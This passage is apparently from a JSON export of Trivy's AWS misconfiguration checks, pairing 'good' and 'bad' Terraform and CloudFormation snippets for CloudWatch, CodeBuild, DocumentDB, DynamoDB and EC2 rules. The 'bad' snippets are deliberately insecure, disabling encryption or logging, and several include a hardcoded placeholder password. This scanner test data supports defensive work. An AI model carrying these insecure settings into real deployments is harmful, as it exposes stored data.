              "resource \"aws_kms_key\" \"cloudwatch\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_kms_alias\" \"cloudwatch\" {\n  name          = \"alias/cloudwatch\"\n  target_key_id = aws_kms_key.cloudwatch.key_id\n}\nresource \"aws_cloudwatch_log_group\" \"good_example\" {\n  name = \"good_example\"\n\n  kms_key_id = aws_kms_alias.cloudwatch.arn\n}"
            ],
            "bad": [
              "resource \"aws_cloudwatch_log_group\" \"bad_example\" {\n  name = \"bad_example\"\n\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CODEBUILD-ENABLE_ENCRYPTION",
        "title": "Enable Encryption",
        "provider": "aws",
        "service": "codebuild",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html\n  good:\n    - |-\n      Resources:\n        GoodProject:\n          Type: AWS::CodeBuild::Project\n          Properties:\n            Artifacts:\n              EncryptionDisabled: false\n            SecondaryArtifacts:\n              - EncryptionDisabled: false\n  bad:\n    - |-\n      Resources:\n        GoodProject:\n          Type: AWS::CodeBuild::Project\n          Properties:\n            Artifacts:\n              EncryptionDisabled: true\n            SecondaryArtifacts:\n              - EncryptionDisabled: false\n    - |-\n      Resources:\n        GoodProject:\n          Type: AWS::CodeBuild::Project\n          Properties:\n            Artifacts:\n              EncryptionDisabled: false\n            SecondaryArtifacts:\n              - EncryptionDisabled: true\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled\n  good:\n    - |-\n      resource \"aws_codebuild_project\" \"good_example\" {\n        artifacts {}\n      }\n    - |-\n      resource \"aws_codebuild_project\" \"good_example\" {\n        artifacts {\n          encryption_disabled = false\n        }\n      }\n    - |-\n      resource \"aws_codebuild_project\" \"codebuild\" {\n        secondary_artifacts {\n          encryption_disabled = false\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_codebuild_project\" \"bad_example\" {\n        artifacts {\n          encryption_disabled = true\n        }\n      }\n    - |-\n      resource \"aws_codebuild_project\" \"bad_example\" {\n        artifacts {}\n\n        secondary_artifacts {\n          encryption_disabled = true\n        }\n      }\n",
        "file_name": "enable_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/codebuild/enable_encryption.yaml",
        "local_path": "aws/codebuild/enable_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html"
            ],
            "good": [
              "Resources:\n  GoodProject:\n    Type: AWS::CodeBuild::Project\n    Properties:\n      Artifacts:\n        EncryptionDisabled: false\n      SecondaryArtifacts:\n        - EncryptionDisabled: false"
            ],
            "bad": [
              "Resources:\n  GoodProject:\n    Type: AWS::CodeBuild::Project\n    Properties:\n      Artifacts:\n        EncryptionDisabled: true\n      SecondaryArtifacts:\n        - EncryptionDisabled: false",
              "Resources:\n  GoodProject:\n    Type: AWS::CodeBuild::Project\n    Properties:\n      Artifacts:\n        EncryptionDisabled: false\n      SecondaryArtifacts:\n        - EncryptionDisabled: true"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled"
            ],
            "good": [
              "resource \"aws_codebuild_project\" \"good_example\" {\n  artifacts {}\n}",
              "resource \"aws_codebuild_project\" \"good_example\" {\n  artifacts {\n    encryption_disabled = false\n  }\n}",
              "resource \"aws_codebuild_project\" \"codebuild\" {\n  secondary_artifacts {\n    encryption_disabled = false\n  }\n}"
            ],
            "bad": [
              "resource \"aws_codebuild_project\" \"bad_example\" {\n  artifacts {\n    encryption_disabled = true\n  }\n}",
              "resource \"aws_codebuild_project\" \"bad_example\" {\n  artifacts {}\n\n  secondary_artifacts {\n    encryption_disabled = true\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CONFIG-AGGREGATE_ALL_REGIONS",
        "title": "Aggregate All Regions",
        "provider": "aws",
        "service": "config",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Config::ConfigurationAggregator\n          Properties:\n            AccountAggregationSources:\n              - AllAwsRegions: true\n            ConfigurationAggregatorName: GoodAccountLevelAggregation\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Config::ConfigurationAggregator\n          Properties:\n            ConfigurationAggregatorName: GoodAccountLevelAggregation\n            OrganizationAggregationSource:\n              AllAwsRegions: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Config::ConfigurationAggregator\n          Properties:\n            ConfigurationAggregatorName: BadAccountLevelAggregation\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/config_configuration_aggregator#all_regions\n  good:\n    - |-\n      resource \"aws_config_configuration_aggregator\" \"good_example\" {\n        name = \"example\"\n\n        account_aggregation_source {\n          account_ids = [\"123456789012\"]\n          all_regions = true\n        }\n      }\n    - |-\n      resource \"aws_config_configuration_aggregator\" \"good_example\" {\n        name = \"example\"\n\n        organization_aggregation_source {\n          role_arn    = \"arn:aws:iam::123456789012:role/ConfigAggregatorRole\"\n          all_regions = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_config_configuration_aggregator\" \"bad_example\" {\n        name = \"example\"\n\n        account_aggregation_source {\n          account_ids = [\"123456789012\"]\n          regions     = [\"us-west-2\", \"eu-west-1\"]\n        }\n      }\n",
        "file_name": "aggregate_all_regions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/config/aggregate_all_regions.yaml",
        "local_path": "aws/config/aggregate_all_regions.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Config::ConfigurationAggregator\n    Properties:\n      AccountAggregationSources:\n        - AllAwsRegions: true\n      ConfigurationAggregatorName: GoodAccountLevelAggregation",
              "Resources:\n  GoodExample:\n    Type: AWS::Config::ConfigurationAggregator\n    Properties:\n      ConfigurationAggregatorName: GoodAccountLevelAggregation\n      OrganizationAggregationSource:\n        AllAwsRegions: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Config::ConfigurationAggregator\n    Properties:\n      ConfigurationAggregatorName: BadAccountLevelAggregation"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/config_configuration_aggregator#all_regions"
            ],
            "good": [
              "resource \"aws_config_configuration_aggregator\" \"good_example\" {\n  name = \"example\"\n\n  account_aggregation_source {\n    account_ids = [\"123456789012\"]\n    all_regions = true\n  }\n}",
              "resource \"aws_config_configuration_aggregator\" \"good_example\" {\n  name = \"example\"\n\n  organization_aggregation_source {\n    role_arn    = \"arn:aws:iam::123456789012:role/ConfigAggregatorRole\"\n    all_regions = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_config_configuration_aggregator\" \"bad_example\" {\n  name = \"example\"\n\n  account_aggregation_source {\n    account_ids = [\"123456789012\"]\n    regions     = [\"us-west-2\", \"eu-west-1\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DOCUMENTDB-ENABLE_LOG_EXPORT",
        "title": "Enable Log Export",
        "provider": "aws",
        "service": "documentdb",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n            EnableCloudwatchLogsExports:\n              - audit\n              - profiler\n\n        InstanceInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n\n        BadInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#enabled_cloudwatch_logs_exports\n  good:\n    - |-\n      resource \"aws_docdb_cluster\" \"good_example\" {\n        cluster_identifier              = \"my-docdb-cluster\"\n        master_username                 = \"foo\"\n        master_password                 = \"mustbeeightchars\"\n        enabled_cloudwatch_logs_exports = \"audit\"\n      }\n    - |-\n      resource \"aws_docdb_cluster\" \"good_example\" {\n        cluster_identifier              = \"my-docdb-cluster\"\n        master_username                 = \"foo\"\n        master_password                 = \"mustbeeightchars\"\n        enabled_cloudwatch_logs_exports = \"profiler\"\n      }\n  bad:\n    - |-\n      resource \"aws_docdb_cluster\" \"bad_example\" {\n        cluster_identifier              = \"my-docdb-cluster\"\n        master_username                 = \"foo\"\n        master_password                 = \"mustbeeightchars\"\n        enabled_cloudwatch_logs_exports = \"something\"\n      }\n",
        "file_name": "enable_log_export.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/documentdb/enable_log_export.yaml",
        "local_path": "aws/documentdb/enable_log_export.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n      EnableCloudwatchLogsExports:\n        - audit\n        - profiler\n\n  InstanceInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n\n  BadInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#enabled_cloudwatch_logs_exports"
            ],
            "good": [
              "resource \"aws_docdb_cluster\" \"good_example\" {\n  cluster_identifier              = \"my-docdb-cluster\"\n  master_username                 = \"foo\"\n  master_password                 = \"mustbeeightchars\"\n  enabled_cloudwatch_logs_exports = \"audit\"\n}",
              "resource \"aws_docdb_cluster\" \"good_example\" {\n  cluster_identifier              = \"my-docdb-cluster\"\n  master_username                 = \"foo\"\n  master_password                 = \"mustbeeightchars\"\n  enabled_cloudwatch_logs_exports = \"profiler\"\n}"
            ],
            "bad": [
              "resource \"aws_docdb_cluster\" \"bad_example\" {\n  cluster_identifier              = \"my-docdb-cluster\"\n  master_username                 = \"foo\"\n  master_password                 = \"mustbeeightchars\"\n  enabled_cloudwatch_logs_exports = \"something\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DOCUMENTDB-ENABLE_STORAGE_ENCRYPTION",
        "title": "Enable Storage Encryption",
        "provider": "aws",
        "service": "documentdb",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n            StorageEncrypted: true\n\n        InstanceInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n\n        BadInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#storage_encrypted\n  good:\n    - |-\n      resource \"aws_docdb_cluster\" \"good_example\" {\n        cluster_identifier = \"my-docdb-cluster\"\n        master_username    = \"foo\"\n        master_password    = \"mustbeeightchars\"\n        storage_encrypted  = true\n      }\n  bad:\n    - |-\n      resource \"aws_docdb_cluster\" \"bad_example\" {\n        cluster_identifier = \"my-docdb-cluster\"\n        master_username    = \"foo\"\n        master_password    = \"mustbeeightchars\"\n        storage_encrypted  = false\n      }\n",
        "file_name": "enable_storage_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/documentdb/enable_storage_encryption.yaml",
        "local_path": "aws/documentdb/enable_storage_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n      StorageEncrypted: true\n\n  InstanceInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n\n  BadInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#storage_encrypted"
            ],
            "good": [
              "resource \"aws_docdb_cluster\" \"good_example\" {\n  cluster_identifier = \"my-docdb-cluster\"\n  master_username    = \"foo\"\n  master_password    = \"mustbeeightchars\"\n  storage_encrypted  = true\n}"
            ],
            "bad": [
              "resource \"aws_docdb_cluster\" \"bad_example\" {\n  cluster_identifier = \"my-docdb-cluster\"\n  master_username    = \"foo\"\n  master_password    = \"mustbeeightchars\"\n  storage_encrypted  = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DOCUMENTDB-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "documentdb",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n            KmsKeyId: your-kms-key-id\n\n        InstanceInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::DocDB::DBCluster\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBClusterParameterGroupName: default.docdb3.6\n\n        BadInstanceExample:\n          Type: AWS::DocDB::DBInstance\n          Properties:\n            DBClusterIdentifier: sample-cluster\n            DBInstanceClass: db.r5.large\n            DBInstanceIdentifier: sample-cluster-instance-0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"docdb_encryption\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_docdb_cluster\" \"docdb\" {\n        cluster_identifier = \"my-docdb-cluster\"\n        master_username    = \"foo\"\n        master_password    = \"mustbeeightchars\"\n        kms_key_id         = aws_kms_key.docdb_encryption.arn\n      }\n  bad:\n    - |-\n      resource \"aws_docdb_cluster\" \"docdb\" {\n        cluster_identifier  = \"my-docdb-cluster\"\n        master_username     = \"foo\"\n        master_password     = \"mustbeeightchars\"\n        skip_final_snapshot = true\n      }\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/documentdb/encryption_customer_key.yaml",
        "local_path": "aws/documentdb/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-docdb-dbcluster.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n      KmsKeyId: your-kms-key-id\n\n  InstanceInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::DocDB::DBCluster\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBClusterParameterGroupName: default.docdb3.6\n\n  BadInstanceExample:\n    Type: AWS::DocDB::DBInstance\n    Properties:\n      DBClusterIdentifier: sample-cluster\n      DBInstanceClass: db.r5.large\n      DBInstanceIdentifier: sample-cluster-instance-0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"docdb_encryption\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_docdb_cluster\" \"docdb\" {\n  cluster_identifier = \"my-docdb-cluster\"\n  master_username    = \"foo\"\n  master_password    = \"mustbeeightchars\"\n  kms_key_id         = aws_kms_key.docdb_encryption.arn\n}"
            ],
            "bad": [
              "resource \"aws_docdb_cluster\" \"docdb\" {\n  cluster_identifier  = \"my-docdb-cluster\"\n  master_username     = \"foo\"\n  master_password     = \"mustbeeightchars\"\n  skip_final_snapshot = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DYNAMODB-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "dynamodb",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::DAX::Cluster\n          Properties:\n            ClusterName: MyDAXCluster\n            IAMRoleARN: arn:aws:iam::111122223333:role/DaxAccess\n            NodeType: dax.r3.large\n            ReplicationFactor: 1\n            SSESpecification:\n              SSEEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::DAX::Cluster\n          Properties:\n            ClusterName: MyDAXCluster\n            IAMRoleARN: arn:aws:iam::111122223333:role/DaxAccess\n            NodeType: dax.r3.large\n            ReplicationFactor: 1\n            SubnetGroupName: !Ref subnetGroupClu\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dax_cluster#server_side_encryption\n  good:\n    - |-\n      resource \"aws_dax_cluster\" \"good_example\" {\n        server_side_encryption {\n          enabled = true // enabled server side encryption\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_dax_cluster\" \"bad_example\" {\n        // no server side encryption at all\n      }\n    - |-\n      resource \"aws_dax_cluster\" \"bad_example\" {\n        server_side_encryption {\n          // empty server side encryption config\n        }\n      }\n    - |-\n      resource \"aws_dax_cluster\" \"bad_example\" {\n        server_side_encryption {\n          enabled = false // disabled server side encryption\n        }\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/dynamodb/enable_at_rest_encryption.yaml",
        "local_path": "aws/dynamodb/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::DAX::Cluster\n    Properties:\n      ClusterName: MyDAXCluster\n      IAMRoleARN: arn:aws:iam::111122223333:role/DaxAccess\n      NodeType: dax.r3.large\n      ReplicationFactor: 1\n      SSESpecification:\n        SSEEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::DAX::Cluster\n    Properties:\n      ClusterName: MyDAXCluster\n      IAMRoleARN: arn:aws:iam::111122223333:role/DaxAccess\n      NodeType: dax.r3.large\n      ReplicationFactor: 1\n      SubnetGroupName: !Ref subnetGroupClu"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dax_cluster#server_side_encryption"
            ],
            "good": [
              "resource \"aws_dax_cluster\" \"good_example\" {\n  server_side_encryption {\n    enabled = true // enabled server side encryption\n  }\n}"
            ],
            "bad": [
              "resource \"aws_dax_cluster\" \"bad_example\" {\n  // no server side encryption at all\n}",
              "resource \"aws_dax_cluster\" \"bad_example\" {\n  server_side_encryption {\n    // empty server side encryption config\n  }\n}",
              "resource \"aws_dax_cluster\" \"bad_example\" {\n  server_side_encryption {\n    enabled = false // disabled server side encryption\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DYNAMODB-ENABLE_RECOVERY",
        "title": "Enable Recovery",
        "provider": "aws",
        "service": "dynamodb",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#point_in_time_recovery\n  good:\n    - |-\n      resource \"aws_dynamodb_table\" \"good_example\" {\n        name             = \"example\"\n        hash_key         = \"TestTableHashKey\"\n        billing_mode     = \"PAY_PER_REQUEST\"\n        stream_enabled   = true\n        stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n        attribute {\n          name = \"TestTableHashKey\"\n          type = \"S\"\n        }\n\n        point_in_time_recovery {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_dynamodb_table\" \"bad_example\" {\n        name             = \"example\"\n        hash_key         = \"TestTableHashKey\"\n        billing_mode     = \"PAY_PER_REQUEST\"\n        stream_enabled   = true\n        stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n        attribute {\n          name = \"TestTableHashKey\"\n          type = \"S\"\n        }\n      }\n",
        "file_name": "enable_recovery.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/dynamodb/enable_recovery.yaml",
        "local_path": "aws/dynamodb/enable_recovery.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#point_in_time_recovery"
            ],
            "good": [
              "resource \"aws_dynamodb_table\" \"good_example\" {\n  name             = \"example\"\n  hash_key         = \"TestTableHashKey\"\n  billing_mode     = \"PAY_PER_REQUEST\"\n  stream_enabled   = true\n  stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n  attribute {\n    name = \"TestTableHashKey\"\n    type = \"S\"\n  }\n\n  point_in_time_recovery {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_dynamodb_table\" \"bad_example\" {\n  name             = \"example\"\n  hash_key         = \"TestTableHashKey\"\n  billing_mode     = \"PAY_PER_REQUEST\"\n  stream_enabled   = true\n  stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n  attribute {\n    name = \"TestTableHashKey\"\n    type = \"S\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DYNAMODB-TABLE_CUSTOMER_KEY",
        "title": "Table Customer Key",
        "provider": "aws",
        "service": "dynamodb",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#server_side_encryption\n  good:\n    - |-\n      resource \"aws_kms_key\" \"dynamo_db_kms\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_dynamodb_table\" \"good_example\" {\n        name = \"example\"\n        server_side_encryption {\n          enabled     = true\n          kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_dynamodb_table\" \"bad_example\" {\n        name = \"example\"\n      }\n    - |-\n      resource \"aws_dynamodb_table\" \"bad_example\" {\n        name = \"example\"\n        server_side_encryption {\n          enabled     = true\n          kms_key_arn = \"alias/aws/dynamodb\"\n        }\n      }\n    - |-\n      resource \"aws_kms_key\" \"dynamo_db_kms\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_dynamodb_table\" \"bad_example\" {\n        name = \"example\"\n        server_side_encryption {\n          enabled     = false\n          kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n        }\n      }\n",
        "file_name": "table_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/dynamodb/table_customer_key.yaml",
        "local_path": "aws/dynamodb/table_customer_key.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#server_side_encryption"
            ],
            "good": [
              "resource \"aws_kms_key\" \"dynamo_db_kms\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_dynamodb_table\" \"good_example\" {\n  name = \"example\"\n  server_side_encryption {\n    enabled     = true\n    kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n  }\n}"
            ],
            "bad": [
              "resource \"aws_dynamodb_table\" \"bad_example\" {\n  name = \"example\"\n}",
              "resource \"aws_dynamodb_table\" \"bad_example\" {\n  name = \"example\"\n  server_side_encryption {\n    enabled     = true\n    kms_key_arn = \"alias/aws/dynamodb\"\n  }\n}",
              "resource \"aws_kms_key\" \"dynamo_db_kms\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_dynamodb_table\" \"bad_example\" {\n  name = \"example\"\n  server_side_encryption {\n    enabled     = false\n    kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ADD_DESCRIPTION_TO_SECURITY_GROUP",
        "title": "Add Description To Security Group",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"-1\"\n  bad:\n    - |-\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"-1\"\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule\n  good:\n    - |-\n      resource \"aws_security_group\" \"good_example\" {\n        name        = \"http\"\n        description = \"Allow inbound HTTP traffic\"\n\n        ingress {\n          description = \"HTTP from VPC\"\n          from_port   = 80\n          to_port     = 80\n          protocol    = \"tcp\"\n          cidr_blocks = [aws_vpc.main.cidr_block]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_security_group\" \"bad_example\" {\n        name        = \"http\"\n        description = \"\"\n\n        ingress {\n          description = \"HTTP from VPC\"\n          from_port   = 80\n          to_port     = 80\n          protocol    = \"tcp\"\n          cidr_blocks = [aws_vpc.main.cidr_block]\n        }\n      }\n",
        "file_name": "add_description_to_security_group.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/add_description_to_security_group.yaml",
        "local_path": "aws/ec2/add_description_to_security_group.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"-1\""
            ],
            "bad": [
              "Resources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"-1\""
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule"
            ],
            "good": [
              "resource \"aws_security_group\" \"good_example\" {\n  name        = \"http\"\n  description = \"Allow inbound HTTP traffic\"\n\n  ingress {\n    description = \"HTTP from VPC\"\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [aws_vpc.main.cidr_block]\n  }\n}"
            ],
            "bad": [
